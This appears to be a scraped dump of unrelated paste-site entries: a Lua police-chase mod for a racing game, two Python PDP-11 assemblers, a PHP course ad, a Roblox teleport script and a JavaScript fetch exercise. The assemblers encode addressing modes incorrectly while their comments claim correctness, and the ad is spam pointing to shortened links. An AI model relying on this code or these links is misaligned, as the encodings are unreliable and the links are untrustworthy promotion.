        iconsColorOn[2] = rgbm(1,0,0,1)
        if pursuit.suspect and pursuit.suspect.speedKmh < 50 and car.speedKmh < 20 and uiStats.isMouseLeftKeyClicked then
            pursuit.hasArrested = true
        end
    elseif ui.rectHovered(iconPos.cams2, iconPos.cams1) then
        iconsColorOn[3] = rgbm(1,0,0,1)
        if uiStats.isMouseLeftKeyClicked then
            if camerasOpen then camerasOpen = false
            else
                camerasOpen = true
                arrestLogsOpen = false
                if settingsOpen then
                    onsettingsChange()
                    settingsOpen = false
                end
            end
        end
    elseif ui.rectHovered(iconPos.lost2, iconPos.lost1) then
        iconsColorOn[4] = rgbm(1,0,0,1)
        if pursuit.suspect and uiStats.isMouseLeftKeyClicked then
            lostSuspect()
        end
    elseif ui.rectHovered(iconPos.logs2, iconPos.logs1) then
        iconsColorOn[5] = rgbm(1,0,0,1)
        if uiStats.isMouseLeftKeyClicked then
            if arrestLogsOpen then arrestLogsOpen = false
            else
                arrestLogsOpen = true
                camerasOpen = false
                if settingsOpen then
                    onsettingsChange()
                    settingsOpen = false
                end
            end
        end
    elseif ui.rectHovered(iconPos.menu2, iconPos.menu1) then
        iconsColorOn[6] = rgbm(1,0,0,1)
        if uiStats.isMouseLeftKeyClicked then
            if settingsOpen then
                onsettingsChange()
                settingsOpen = false
            else
                settingsOpen = true
                arrestLogsOpen = false
                camerasOpen = false
            end
        end
    end
    ui.image(hudImg.base, imageSize, rgbm.colors.white)
    ui.drawImage(hudImg.radar, vec2(0,0), imageSize, iconsColorOn[1])
    ui.drawImage(hudImg.arrest, vec2(0,0), imageSize, iconsColorOn[2])
    ui.drawImage(hudImg.cams, vec2(0,0), imageSize, iconsColorOn[3])
    ui.drawImage(hudImg.lost, vec2(0,0), imageSize, iconsColorOn[4])
    ui.drawImage(hudImg.logs, vec2(0,0), imageSize, iconsColorOn[5])
    ui.drawImage(hudImg.menu, vec2(0,0), imageSize, iconsColorOn[6])
end

local function playerSelected(player)
    if player.speedKmh > 50 then
        pursuit.suspect = player
        pursuit.nextMessage = 30
        pursuit.level = 1
        local msgToSend = ""Officer "" .. ac.getDriverName(0) .. "" is chasing you. Run! ""
        pursuit.startedTime = settings.timeMsg
        pursuit.engage = true
        acpPolice{message = msgToSend, messageType = 0, yourIndex = ac.getCar(pursuit.suspect.index).sessionID}
        if cspAboveP218 then
            ac.setExtraSwitch(0, true)
        end
    end
end

local function hudInChase()
    ui.pushDWriteFont(""Orbitron;Weight=Black"")
    ui.sameLine(20)
    ui.beginGroup()
    ui.newLine(1)
    local textPursuit = ""LVL : "" .. math.floor(pursuit.level/2)
    ui.dwriteTextWrapped(ac.getDriverName(pursuit.suspect.index) .. '\n'
                        .. string.gsub(string.gsub(ac.getCarName(pursuit.suspect.index), ""%W"", "" ""), ""  "", """")
                        .. '\n' .. string.format(""Speed: %d "", pursuit.suspect.speedKmh * settings.unitMult) .. settings.unit
                        .. '\n' .. textPursuit, settings.fontSize/2, rgbm.colors.white)
    ui.dummy(vec2(imageSize.x/5,imageSize.y/20))
    ui.newLine(30)
    ui.sameLine()
    if ui.button('Cancel Chase', vec2(imageSize.x/5, imageSize.y/20)) then
        lostSuspect()
    end
    ui.endGroup()
    ui.popDWriteFont()
end

local function drawText()
    local uiStats = ac.getUI()
    ui.pushDWriteFont(""Orbitron;Weight=Bold"")
    ui.dwriteDrawText(""RADAR ACTIVE"", settings.fontSize/2, vec2((textPos.box2.x - ui.measureDWriteText(""RADAR ACTIVE"", settings.fontSize/2).x)/2, 0), rgbm(1,0,0,1))
    ui.popDWriteFont()
    ui.pushDWriteFont(""Orbitron;Weight=Regular"")
    ui.dwriteDrawText(""NEARBY VEHICULE SPEED SCANNING"", settings.fontSize/3, vec2((textPos.box2.x - ui.measureDWriteText(""NEARBY VEHICULE SPEED SCANNING"", settings.fontSize/3).x)/2, settings.fontSize/1.5), rgbm(1,0,0,1))

    local colorText = rgbm(1,1,1,1)
    textPos.box1 = vec2(0, textSize.size.y*2.5)
    ui.dummy(vec2(textPos.box2.x,settings.fontSize))
    for i = 1, #playersInRange do
        colorText = rgbm(1,1,1,1)
        ui.drawRect(vec2(textPos.box2.x/9,textPos.box1.y), vec2(textPos.box2.x*8/9, textPos.box1.y + textPos.box2.y), rgbm(1,1,1,0.1), 1)
        if ui.rectHovered(textPos.box1, textPos.box1 + textPos.box2) then
            colorText = rgbm(1,0,0,1)
            if uiStats.isMouseLeftKeyClicked then
                playerSelected(playersInRange[i].player)
            end
        end
        ui.dwriteDrawText(playersInRange[i].text, settings.fontSize/2, vec2((textPos.box2.x - ui.measureDWriteText(ac.getDriverName(playersInRange[i].player.index) .. "" - 000 "" .. settings.unit, settings.fontSize/2).x)/2, textPos.box1.y + textSize.size.y/5), colorText)
        textPos.box1 = textPos.box1 + textPos.addBox
        ui.dummy(vec2(textPos.box2.x, i * settings.fontSize/5))
    end
    ui.popDWriteFont()
end

local function radarUI()
    ui.toolWindow('radarText', textSize.window1, textSize.window2, true, function ()
        ui.childWindow('childradar', textSize.window2, true , function ()
            if pursuit.suspect then hudInChase()
            else drawText() end
        end)
    end)
    ui.transparentWindow('radar', vec2(settings.hudOffsetX, settings.hudOffsetY), imageSize, true, function ()
        drawImage()
    end)
end

local function hidePlayers()
    local hideRange = 500
    for i = ac.getSim().carsCount - 1, 0, -1 do
        local player = ac.getCar(i)
        local playerCarID = ac.getCarID(i)
        if player.isConnected and ac.getCarBrand(i) ~= ""traffic"" then
            if playerCarID ~= valideCar[1] and playerCarID ~= valideCar[2] and playerCarID ~= valideCar[3] then
                if player.position.x > car.position.x - hideRange and player.position.z > car.position.z - hideRange and player.position.x < car.position.x + hideRange and player.position.z < car.position.z + hideRange then
                    ac.hideCarLabels(i, false)
                else
                    ac.hideCarLabels(i, true)
                end
            end
        end
    end
end

local function radarUpdate()
    if firstload and not pursuit.suspect then return end
    local radarRange = 250
    local previousSize = #playersInRange

    local j = 1
    for i = ac.getSim().carsCount - 1, 0, -1 do
        local player = ac.getCar(i)
        local playerCarID = ac.getCarID(i)
        if player.isConnected and ac.getCarBrand(i) ~= ""traffic"" then
            if playerCarID ~= valideCar[1] and playerCarID ~= valideCar[2] and playerCarID ~= valideCar[3] then
                if player.position.x > car.position.x - radarRange and player.position.z > car.position.z - radarRange and player.position.x < car.position.x + radarRange and player.position.z < car.position.z + radarRange then
                    playersInRange[j] = {}
                    playersInRange[j].player = player
                    playersInRange[j].text = ac.getDriverName(player.index) .. string.format("" - %d "", player.speedKmh * settings.unitMult) .. settings.unit
                    j = j + 1
                    if j == 9 then break end
                end
            end
        end
    end
    for i = j, previousSize do playersInRange[i] = nil end
end

---------------------------------------------------------------------------------------------- Chase ----------------------------------------------------------------------------------------------

local function inRange()
    local distance_x = pursuit.suspect.position.x - car.position.x
    local distance_z = pursuit.suspect.position.z - car.position.z
    local distanceSquared = distance_x * distance_x + distance_z * distance_z
    if(distanceSquared < pursuit.minDistance) then
        pursuit.enable = true
        pursuit.lostSight = false
        pursuit.timeLostSight = 2
    elseif (distanceSquared < pursuit.maxDistance) then resetChase()
    else
        if not pursuit.lostSight then
            pursuit.lostSight = true
            pursuit.timeLostSight = 2
        else
            pursuit.timeLostSight = pursuit.timeLostSight - ui.deltaTime()
            if pursuit.timeLostSight < 0 then lostSuspect() end
        end
    end
end

local function sendChatToSuspect()
    if pursuit.enable then
        if 0 < pursuit.nextMessage then
            pursuit.nextMessage = pursuit.nextMessage - ui.deltaTime()
        elseif pursuit.nextMessage < 0 then
            local nb = tostring(pursuit.level)
            acpPolice{message = nb, messageType = 1, yourIndex = ac.getCar(pursuit.suspect.index).sessionID}
            if pursuit.level < 10 then
                pursuit.level = pursuit.level + 1
                chaseLVL.messageTimer = settings.timeMsg
                chaseLVL.message = ""CHASE LEVEL "" .. math.floor(pursuit.level/2)
                if pursuit.level > 8 then
                    chaseLVL.color = rgbm.colors.red
                elseif pursuit.level > 6 then
                    chaseLVL.color = rgbm.colors.orange
                elseif pursuit.level > 4 then
                    chaseLVL.color = rgbm.colors.yellow
                else
                    chaseLVL.color = rgbm.colors.white
                end
            end
            pursuit.nextMessage = 30
        end
    end
end

local function showPursuitMsg()
    local text = """"
    if chaseLVL.messageTimer > 0 then
        chaseLVL.messageTimer = chaseLVL.messageTimer - ui.deltaTime()
        text = chaseLVL.message
    end
    if pursuit.startedTime > 0 then
        if pursuit.suspect then
            text = ""You are chasing "" .. ac.getDriverName(pursuit.suspect.index) .. "" driving a "" .. string.gsub(string.gsub(ac.getCarName(pursuit.suspect.index), ""%W"", "" ""), ""  "", """") .. "" ! Get him! ""
        end
        if pursuit.startedTime > 6 then showPoliceLights() end
        if pursuit.engage and pursuit.startedTime < 8 then
            ac.sendChatMessage(formatMessage(msgEngage.msg[math.random(#msgEngage.msg)]))
            pursuit.engage = false
        end
    end
    if text ~= """" then
        local textLenght = ui.measureDWriteText(text, settings.fontSizeMSG)
        local rectPos1 = vec2(settings.msgOffsetX - textLenght.x/2, settings.msgOffsetY)
        local rectPos2 = vec2(settings.msgOffsetX + textLenght.x/2, settings.msgOffsetY + settings.fontSizeMSG)
        local rectOffset = vec2(10, 10)
        if ui.time() % 1 < 0.5 then
            ui.drawRectFilled(rectPos1 - vec2(10,0), rectPos2 + rectOffset, COLORSMSGBG, 10)
        else
            ui.drawRectFilled(rectPos1 - vec2(10,0), rectPos2 + rectOffset, rgbm(0,0,0,0.5), 10)
        end
        ui.dwriteDrawText(text, settings.fontSizeMSG, rectPos1, chaseLVL.color)
    end
end

local function arrestSuspect()
    if pursuit.hasArrested and pursuit.suspect then
        local msgToSend = formatMessage(msgArrest.msg[math.random(#msgArrest.msg)])
        table.insert(arrestations, msgToSend .. os.date(""\nDate of the Arrestation: %c""))
        ac.sendChatMessage(msgToSend .. ""\nPlease Get Back Pit, GG!"")
        pursuit.id = pursuit.suspect.sessionID
        if playerData.Arrests == nil then playerData.Arrests = 0 end
        playerData.Arrests = playerData.Arrests + 1
        pursuit.startedTime = 0
        pursuit.suspect = nil
        pursuit.timerArrest = 1
    elseif pursuit.hasArrested then
        if pursuit.timerArrest > 0 then
            pursuit.timerArrest = pursuit.timerArrest - ui.deltaTime()
        else
            acpPolice{message = ""BUSTED!"", messageType = 2, yourIndex = pursuit.id}
            pursuit.timerArrest = 0
            pursuit.suspect = nil
            pursuit.id = -1
            pursuit.hasArrested = false
            pursuit.startedTime = 0
            pursuit.enable = false
            pursuit.level = 1
            pursuit.nextMessage = 20
            pursuit.lostSight = false
            pursuit.timeLostSight = 0
            local data = {
                [""Arrests""] = playerData.Arrests,
            }
            updatefirebase()
            updatefirebaseData(""Arrests"", data)
        end
    end
end

local function chaseUpdate()
    if pursuit.startedTime > 0 then pursuit.startedTime = pursuit.startedTime - ui.deltaTime()
    else pursuit.startedTime = 0 end
    if pursuit.suspect then
        sendChatToSuspect()
        inRange()
    end
    arrestSuspect()
end

---------------------------------------------------------------------------------------------- Menu ----------------------------------------------------------------------------------------------

local function arrestLogsUI()
    ui.dwriteTextAligned(""Arrestation Logs"", 40, ui.Alignment.Center, ui.Alignment.Center, vec2(windowWidth/4,60), false, rgbm.colors.white)
    ui.drawLine(vec2(0,60), vec2(windowWidth/4,60), rgbm.colors.white, 1)
    ui.newLine(15)
    ui.sameLine(10)
    ui.beginGroup()
    local allMsg = """"
    ui.dwriteText(""Click on the button next to the message you want to copy."", 15, rgbm.colors.white)
    ui.sameLine(windowWidth/4 - 120)
    if ui.button('Close', vec2(100, windowHeight/50)) then arrestLogsOpen = false end
    for i = 1, #arrestations do
        if ui.smallButton(""#"" .. i .. "": "", vec2(0,10)) then
            ui.setClipboardText(arrestations[i])
        end
        ui.sameLine()
        ui.dwriteTextWrapped(arrestations[i], 15, rgbm.colors.white)
    end
    if #arrestations == 0 then
        ui.dwriteText(""No arrestation logs yet."", 15, rgbm.colors.white)
    end
    ui.newLine()
    if ui.button(""Set all messages to ClipBoard"") then
        for i = 1, #arrestations do
            allMsg = allMsg .. arrestations[i] .. ""\n\n""
        end
        ui.setClipboardText(allMsg)
    end
    ui.endGroup()
end

local buttonPos = windowWidth/65

local function camerasUI()
    ui.dwriteTextAligned(""Surveillance Cameras"", 40, ui.Alignment.Center, ui.Alignment.Center, vec2(windowWidth/6.5,60), false, rgbm.colors.white)
    ui.drawLine(vec2(0,60), vec2(windowWidth/6.5,60), rgbm.colors.white, 1)
    ui.newLine(20)
    ui.beginGroup()
    ui.sameLine(buttonPos)
    if ui.button('Close', vec2(windowWidth/6.5 - buttonPos*2,30)) then camerasOpen = false end
    ui.newLine()
    for i = 1, #cameras do
        local h = math.rad(cameras[i].dir + ac.getCompassAngle(vec3(0, 0, 1)))
        ui.newLine()
        ui.sameLine(buttonPos)
        if ui.button(cameras[i].name, vec2(windowWidth/6.5 - buttonPos*2,30)) then
            ac.setCurrentCamera(ac.CameraMode.Free)
            ac.setCameraPosition(cameras[i].pos)
            ac.setCameraDirection(vec3(math.sin(h), 0, math.cos(h))) 
            ac.setCameraFOV(cameras[i].fov)
        end
    end
    if ac.getSim().cameraMode == ac.CameraMode.Free then
        ui.newLine()
        ui.newLine()
        ui.sameLine(buttonPos)
        if ui.button('Police car camera', vec2(windowWidth/6.5 - buttonPos*2,30)) then ac.setCurrentCamera(ac.CameraMode.Cockpit) end
    end
end


local initialized = false
local menuSize = {vec2(windowWidth/4, windowHeight/3), vec2(windowWidth/6.4, windowHeight/2.2)}
local buttonPressed = false

local function moveMenu()
    if ui.windowHovered() and ui.mouseDown() then buttonPressed = true end
    if ui.mouseReleased() then buttonPressed = false end
    if buttonPressed then settings.menuPos = settings.menuPos + ui.mouseDelta() end
end

---------------------------------------------------------------------------------------------- updates ----------------------------------------------------------------------------------------------

function script.drawUI()
    if carID ~= valideCar[1] and carID ~= valideCar[2] and carID ~= valideCar[3] or cspVersion < cspMinVersion then return end
    if initialized and settings.policeSize then
        if firstload then
            firstload = false
            initsettings()
        end
        radarUI()
        if pursuit.suspect then showStarsPursuit() end
        showPursuitMsg()
        if settingsOpen then
            ui.toolWindow('settings', settings.menuPos, menuSize[2], true, function ()
                ui.childWindow('childsettings', menuSize[2], true, function () settingsWindow() moveMenu() end)
            end)
        elseif arrestLogsOpen then
            ui.toolWindow('ArrestLogs', settings.menuPos, menuSize[1], true, function ()
                ui.childWindow('childArrestLogs', menuSize[1], true, function () arrestLogsUI() moveMenu() end)
            end)
        elseif camerasOpen then
            ui.toolWindow('Cameras', settings.menuPos, menuSize[2], true, function ()
                ui.childWindow('childCameras', menuSize[2], true, function () camerasUI() moveMenu() end)
            end)
        end
    end
end

ac.onCarJumped(0, function (carid)
    if carID == valideCar[1] or carID == valideCar[2] or carID == valideCar[3]then
        if pursuit.suspect then lostSuspect() end
    end
end)

function script.update(dt)
    if carID ~= valideCar[1] and carID ~= valideCar[2] and carID ~= valideCar[3] or cspVersion < cspMinVersion then return end
    if not initialized then
        loadsettings()
        getFirebase()
        initialized = true
    else
        radarUpdate()
        chaseUpdate()
        --hidePlayers()
    end
end

if carID == valideCar[1] or carID == valideCar[2] or carID == valideCar[3] and cspVersion >= cspMinVersion then
    ui.registerOnlineExtra(ui.Icons.Settings, ""Settings"", nil, settingsWindow, nil, ui.OnlineExtraFlags.Tool, 'ui.WindowFlags.AlwaysAutoResize')
end"
LTjWfyd6,pdp-11_my_code,Korotkodul,Python,Thursday 3rd of April 2025 12:16:06 PM CDT,"import re
import struct
from typing import List, Dict, Union


class PDP11Assembler:
    def __init__(self):
        self.labels: Dict[str, int] = {}
        self.current_address = 0o1000
        self.output_data: List[int] = []

        # Таблица команд с правильными опкодами
        self.commands = {
            'halt': {'opcode': 0o000000, 'args': []},
            'mov': {'opcode': 0o010000, 'args': ['ss', 'dd']},
            'add': {'opcode': 0o060000, 'args': ['ss', 'dd']},
        }

    def parse_operand(self, operand: str) -> Dict[str, Union[int, str]]:
        """"""Разбор операнда с правильными режимами адресации""""""
        if not operand:
            return {'mode': 0, 'reg': 0, 'value': 0}

        # Регистровая адресация (R0-R7)
        if re.match(r'^[rR][0-7]$', operand):
            return {'mode': 0, 'reg': int(operand[1]), 'value': 0}

        # Немедленная адресация (#n)
        if operand.startswith('#'):
            value = int(operand[1:])
            return {'mode': 0o27, 'reg': 0, 'value': value}  # Режим 27, регистр 0

        return {'mode': 0, 'reg': 0, 'value': 0}

    def assemble_instruction(self, command: List[str]) -> List[Union[int, str]]:
        """"""Генерация машинного кода с правильным форматом""""""
        if not command:
            return []

        cmd_name = command[0].lower()
        if cmd_name not in self.commands:
            return []

        cmd_info = self.commands[cmd_name]
        args = command[1:]

        if len(args) != len(cmd_info['args']):
            return []

        words = []
        opcode = cmd_info['opcode']

        if cmd_name == 'halt':
            words.append(0o000000)
            return words

        if cmd_name == 'mov':
            src = self.parse_operand(args[0])
            dst = self.parse_operand(args[1])

            # Правильное кодирование для MOV
            instruction = opcode | (src['mode'] << 6) | (dst['reg'] << 3) | dst['mode']
            words.append(instruction)

            if src['mode'] == 0o27:  # Немедленная адресация
                words.append(src['value'])

            return words

        if cmd_name == 'add':
            src = self.parse_operand(args[0])
            dst = self.parse_operand(args[1])

            # Правильное кодирование для ADD
            instruction = opcode | (src['reg'] << 6) | dst['reg']
            words.append(instruction)

            return words

        return []

    def first_pass(self, lines: List[str]):
        """"""Первый проход: сбор меток""""""
        self.current_address = 0o1000
        for line in lines:
            line = line.strip()
            if not line or line.startswith(';'):
                continue

            if ':' in line:
                label, _ = line.split(':', 1)
                self.labels[label.strip()] = self.current_address
                line = line.split(':', 1)[1].strip()
                if not line:
                    continue

            parts = re.split(r'[,\s]+', line)
            cmd = parts[0].lower()

            if cmd in self.commands:
                self.current_address += 2
                if cmd == 'mov' and parts[1].startswith('#'):
                    self.current_address += 2

    def second_pass(self, lines: List[str]):
        """"""Второй проход: генерация кода""""""
        self.current_address = 0o1000
        for line in lines:
            line = line.strip()
            if not line or line.startswith(';'):
                continue

            if ':' in line:
                line = line.split(':', 1)[1].strip()
                if not line:
                    continue

            parts = re.split(r'[,\s]+', line)
            machine_code = self.assemble_instruction(parts)

            for word in machine_code:
                self.output_data.append(word)
                self.current_address += 2

    def write_output_file(self, filename: str):
        """"""Запись в файл в нужном формате""""""
        data_bytes = bytearray()
        for word in self.output_data:
            data_bytes.extend(struct.pack('<H', word))  # Little-endian

        with open(filename, 'w') as f:
            # Первая строка: адрес и размер
            f.write(f""0200 {len(data_bytes):04x}\n"")

            # Байты машинного кода
            for byte in data_bytes:
                f.write(f""{byte:02x}\n"")

    def assemble(self, input_filename: str, output_filename: str):
        """"""Основной метод ассемблирования""""""
        with open(input_filename, 'r') as f:
            lines = f.readlines()

        self.first_pass(lines)
        self.second_pass(lines)
        self.write_output_file(output_filename)


# Пример использования
if __name__ == ""__main__"":
    assembler = PDP11Assembler()

    test_code = """"""
        mov #2, r0
        mov #3, r1
        add r0, r1
        halt
    """"""

    with open(""test.asm"", ""w"") as f:
        f.write(test_code)

    assembler.assemble(""test.asm"", ""output.txt"")
    print(""Ассемблирование завершено. Результат в output.txt"")"
wbiTc13P,*PHP & MySQL: The ULTIMATE Course,f0f077,MySQL,Thursday 3rd of April 2025 12:10:17 PM CDT," **PHP & MySQL: The ULTIMATE Course**  
 **Build Modern, Dynamic Websites from Scratch**  

🚀 **Master PHP & MySQL** and create powerful, database-driven web applications with this **complete, project-based training**—the most comprehensive course online!  

 **🔥 What You’ll Learn**  
✔ **PHP Fundamentals** – Master syntax, functions, OOP, and modern PHP features  
✔ **MySQL & Databases** – Design, query, and manage databases like a pro  
✔ **Security Best Practices** – Prevent SQL injection, XSS, and secure user data  
✔ **User Authentication** – Logins, sessions, cookies, and password hashing  
✔ **CRUD Operations** – **Create, Read, Update, Delete** data dynamically  
✔ **Email Integration** – Send emails (transactional, notifications, etc.)  
✔ **Real-World Projects** – Build a **blog, user system, e-commerce features**, and more!  

 **💡 Why This Course?**  
✅ **Hands-On Learning** – No fluff, just **practical, project-based training**  
✅ **From Zero to Deployment** – Learn everything needed to **launch a live website**  
✅ **Industry Best Practices** – Write clean, efficient, and secure code 
 

✅ **Lifetime Access** – Keep all updates & downloadable resources  

 **🛠 Tools & Technologies**  
- **PHP 8+** (Latest features & optimizations)  
- **MySQL & PDO** (Safe, efficient database interactions)  
- **HTML/CSS/JS Integration** (Full-stack development)  
- **Git & Deployment** (Host your projects online)  

 **🎁 Bonus Content**  
📂 **Downloadable Code & Cheat Sheets**  
🔄 **Real-World Case Studies**  
🆘 **24/7 Support & Community Access**  

 **🚀 Ready to Become a PHP Pro? Enroll Now!**  
🔗 **Get Started Today** → https://short-jambo.ink/zpBS]  

📅 **Last Updated: [Current Date]**  

---
 **🔍 Perfect For:**  
- **Beginners** wanting to learn backend development  
- **Frontend devs** expanding into full-stack  
- **Freelancers** looking to build dynamic websites  
- **Career changers** entering web development  

💬 **Need more details? Ask away!** I can adjust the tone, add pricing, or include sample projects. 😊  
 
PHP, MySQL, Web Development, Backend Development, PHP Course, Database Programming, SQL, Dynamic Websites, PHP Tutorial, Full-Stack Development, CRUD, User Authentication, PHP Projects, PDO, Secure Coding, Website Security, OOP PHP, Blog System, E-Commerce PHP, Coding Bootcamp
for more:https://short-jambo.ink/2VoWz4"
xUSQbfCN,Teleporter script,TotallyGames,Lua,Thursday 3rd of April 2025 11:36:20 AM CDT,"local TeleportService = game:GetService(""TeleportService"")
local targetPlaceId = 98478818876957 --ID  вашего плейса

script.Parent.Touched:Connect(function(hit)
	local player = game.Players:GetPlayerFromCharacter(hit.Parent)
	if player then
		TeleportService:Teleport(targetPlaceId, player)
	end
end)"
vH2ZDrJA,pdp-11_1,Korotkodul,Python,Thursday 3rd of April 2025 10:59:09 AM CDT,"from pyparsing import (Word, Literal, Optional, Group, OneOrMore,
                      alphas, nums, hexnums, Combine, Suppress, ParseException,
                      restOfLine)
import struct
import re

# Конфигурация парсера
octal_number = Combine(Literal('0') + Word('01234567')).setParseAction(lambda t: int(t[0], 8))
decimal_number = Word(nums).setParseAction(lambda t: int(t[0]))
hex_number = Combine(Literal('0') + (Literal('x') | Literal('X')) + Word(hexnums)).setParseAction(lambda t: int(t[0], 16))
number = octal_number | hex_number | decimal_number

register = Word('Rr', nums, max=2).setParseAction(lambda t: f""R{t[0][1:]}"")
indirect = Suppress('(') + register + Suppress(')')
auto_dec = Suppress('-(') + register + Suppress(')')
auto_inc = Suppress('(') + register + Suppress(')+')
indirect_inc = Suppress('@(') + register + Suppress(')+')
immediate = Suppress('#') + number

operand = (indirect_inc | auto_dec | auto_inc | indirect | immediate | register | number)

instruction = Word(alphas.upper(), max=4)
instr_operands = Group(Optional(operand + Optional(Suppress(',') + Optional(operand))))
comment = Suppress(';') + restOfLine
assembly_line = instruction(""opcode"") + instr_operands(""operands"") + Optional(comment)

# Таблица опкодов PDP-11 (расширенная)
OPCODES = {
    'MOV': 0o010000, 'MOVB': 0o110000,
    'ADD': 0o060000, 'SUB': 0o160000,
    'CMP': 0o020000, 'CMPB': 0o120000,
    'BIT': 0o030000, 'BITB': 0o130000,
    'BIC': 0o040000, 'BICB': 0o140000,
    'BIS': 0o050000, 'BISB': 0o150000,
    'CLR': 0o005000, 'CLRB': 0o105000,
    'COM': 0o005100, 'COMB': 0o105100,
    'INC': 0o005200, 'INCB': 0o105200,
    'DEC': 0o005300, 'DECB': 0o105300,
    'NEG': 0o005400, 'NEGB': 0o105400,
    'ADC': 0o005500, 'ADCB': 0o105500,
    'SBC': 0o005600, 'SBCB': 0o105600,
    'TST': 0o005700, 'TSTB': 0o105700,
    'ROR': 0o006000, 'RORB': 0o106000,
    'ROL': 0o006100, 'ROLB': 0o106100,
    'ASR': 0o006200, 'ASRB': 0o106200,
    'ASL': 0o006300, 'ASLB': 0o106300,
    'BR': 0o000400, 'BNE': 0o001000,
    'JMP': 0o000100, 'JSR': 0o004000,
    'RTS': 0o000200, 'HALT': 0o000000
}

# Режимы адресации
ADDR_MODES = {
    'R0': 0o00, 'R1': 0o01, 'R2': 0o02, 'R3': 0o03,
    'R4': 0o04, 'R5': 0o05, 'R6': 0o06, 'R7': 0o07,
    '(R0)': 0o10, '(R1)': 0o11, '(R2)': 0o12, '(R3)': 0o13,
    '(R4)': 0o14, '(R5)': 0o15, '(R6)': 0o16, '(R7)': 0o17,
    '-(R0)': 0o20, '-(R1)': 0o21, '-(R2)': 0o22, '-(R3)': 0o23,
    '-(R4)': 0o24, '-(R5)': 0o25, '-(R6)': 0o26, '-(R7)': 0o27,
    '(R0)+': 0o30, '(R1)+': 0o31, '(R2)+': 0o32, '(R3)+': 0o33,
    '(R4)+': 0o34, '(R5)+': 0o35, '(R6)+': 0o36, '(R7)+': 0o37,
    '@(R0)+': 0o40, '@(R1)+': 0o41, '@(R2)+': 0o42, '@(R3)+': 0o43,
    '@(R4)+': 0o44, '@(R5)+': 0o45, '@(R6)+': 0o46, '@(R7)+': 0o47,
    '#': 0o50
}


def encode_operand(op):
    """"""Кодирует операнд в режим адресации и дополнительное слово""""""
    if isinstance(op, int):
        return 0o67, op  # Непосредственная адресация (абсолютный режим)

    if op.startswith('R'):
        return ADDR_MODES[op], 0

    if op.startswith('('):
        if op.startswith('-('):
            return ADDR_MODES[f""-({op[3:-1]})""], 0
        elif op.endswith(')+'):
            if op.startswith('@'):
                return ADDR_MODES[f""@({op[3:-2]})+""], 0
            return ADDR_MODES[f""({op[1:-2]})+""], 0
        return ADDR_MODES[f""({op[1:-1]})""], 0

    if op.startswith('#'):
        return ADDR_MODES['#'], int(op[1:])

    return 0o67, int(op)  # Абсолютная адресация


def assemble_instruction(parsed_line, pc, labels):
    """"""Генерирует машинный код для одной инструкции""""""
    try:
        opcode = parsed_line.opcode
        operands = parsed_line.operands.asList() if parsed_line.operands else []

        if opcode not in OPCODES:
            raise ValueError(f""Неизвестная инструкция: {opcode}"")

        base_op = OPCODES[opcode]

        # Обработка инструкций без операндов
        if opcode in ['HALT', 'NOP', 'RTS']:
            return struct.pack('<H', base_op)

        # Обработка ветвлений
        if opcode in ['BR', 'BNE', 'BEQ', 'BPL', 'BMI']:
            if not operands:
                raise ValueError(f""Отсутствует операнд для инструкции {opcode}"")
            offset = labels.get(operands[0], pc) - pc
            return struct.pack('<H', base_op | (offset & 0o377))

        # Обработка инструкций с одним операндом
        if len(operands) == 1:
            mode, value = encode_operand(operands[0])
            instruction = base_op | (mode << 6)
            machine_code = struct.pack('<H', instruction)
            if mode == 0o67 or (mode == 0o50 and value > 0o177777):
                machine_code += struct.pack('<H', value)
            return machine_code

        # Обработка инструкций с двумя операндами
        if len(operands) == 2:
            src_mode, src_value = encode_operand(operands[0])
            dst_mode, dst_value = encode_operand(operands[1])
            instruction = base_op | (src_mode << 6) | dst_mode
            machine_code = struct.pack('<H', instruction)

            # Добавляем дополнительные слова для операндов
            if src_mode == 0o67 or (src_mode == 0o50 and src_value > 0o177777):
                machine_code += struct.pack('<H', src_value)
            if dst_mode == 0o67 or (dst_mode == 0o50 and dst_value > 0o177777):
                machine_code += struct.pack('<H', dst_value)

            return machine_code

        raise ValueError(f""Неподдерживаемое количество операндов для {opcode}"")

    except ParseException as e:
        print(f""Ошибка разбора строки: {e}"")
        return None


def assemble_file(input_file, output_file):
    """"""Основная функция ассемблирования""""""
    labels = {}
    pc = 0

    # Первый проход: сбор меток
    with open(input_file, 'r') as f:
        for line_num, line in enumerate(f, 1):
            line = re.sub(r';.*', '', line).strip()
            if not line:
                continue

            # Обработка меток
            if ':' in line:
                label, _ = line.split(':', 1)
                labels[label.strip()] = pc
                line = line.split(':', 1)[1].strip()
                if not line:
                    continue

            try:
                parsed = assembly_line.parseString(line)
                if parsed.opcode in OPCODES:
                    pc += 2  # Базовый размер инструкции
                    # Учет дополнительных слов
                    if parsed.operands:
                        ops = parsed.operands.asList()
                        for op in ops:
                            if isinstance(op, str) and op.startswith('#'):
                                value = int(op[1:])
                                if value > 0o177777:
                                    pc += 2
                            elif not any(c.isalpha() for c in str(op)):
                                pc += 2
            except ParseException:
                continue

    # Второй проход: генерация кода
    with open(input_file, 'r') as f_in, open(output_file, 'wb') as f_out:
        pc = 0
        for line_num, line in enumerate(f_in, 1):
            line = re.sub(r';.*', '', line).strip()
            if not line:
                continue

            # Пропускаем строки с метками
            if ':' in line:
                line = line.split(':', 1)[1].strip()
                if not line:
                    continue

            try:
                parsed = assembly_line.parseString(line)
                machine_code = assemble_instruction(parsed, pc, labels)
                if machine_code:
                    f_out.write(machine_code)
                    pc += len(machine_code)
            except (ParseException, ValueError) as e:
                print(f""Ошибка в строке {line_num}: {e}"")


# Пример программы на PDP-11
sample_program = """"""
    MOV #1000, R0    ; Загрузить значение в R0
    LOOP:
    ADD R1, R0       ; Добавить R1 к R0
    CMP R0, #2000    ; Сравнить с 2000
    BNE LOOP         ; Повторять если не равно
    HALT             ; Останов
""""""

# Сохраняем пример в файл
with open(""pdp11_sample.asm"", ""w"") as f:
    f.write(sample_program)

# Ассемблируем
assemble_file(""pdp11_sample.asm"", ""pdp11_output.bin"")
print(""Ассемблирование завершено. Результат в pdp11_output.bin"")"
9m9Twvec,Untitled,Onesible,JavaScript,Thursday 3rd of April 2025 10:42:33 AM CDT,"function attachEvents() {
    let postUrl = 'http://localhost:3030/jsonstore/blog/posts';
    let commentsUrl = 'http://localhost:3030/jsonstore/blog/comments';

    document.getElementById('btnLoadPosts').addEventListener('click', () => { onPostsRequest(postUrl) });
    document.getElementById('btnViewPost').addEventListener('click', () => { onViewPost(commentsUrl) });
}

async function onPostsRequest(url) {
    let data;

    try {
        let response = await fetch(url);
        data = await response.json();
    } catch {
        return;
    }

    let selectPost = document.getElementById('posts');

    for (let [key, value] of Object.entries(data)) {
        let option = document.createElement('option');

        option.textContent = value.title;
